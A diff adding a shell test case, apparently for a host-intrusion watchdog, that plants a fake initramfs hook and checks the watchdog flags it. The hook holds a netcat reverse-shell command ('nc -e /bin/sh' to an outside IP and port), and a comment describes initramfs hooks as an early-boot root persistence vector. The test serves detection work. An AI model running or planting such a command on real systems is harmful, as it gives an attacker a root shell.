@@ -236,3 +236,21 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in initramfs hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config nc reverse-shell variant INVARIANTs across the
+    # brain. Lock the netcat axis on the early-boot root-exec
+    # persistence surface (T1542/T1546 — initramfs-tools hooks run
+    # AS ROOT when initramfs is rebuilt; their payload executes in
+    # early boot BEFORE the root filesystem is mounted — the most
+    # powerful persistence vector in the brain).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/cryptroot"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
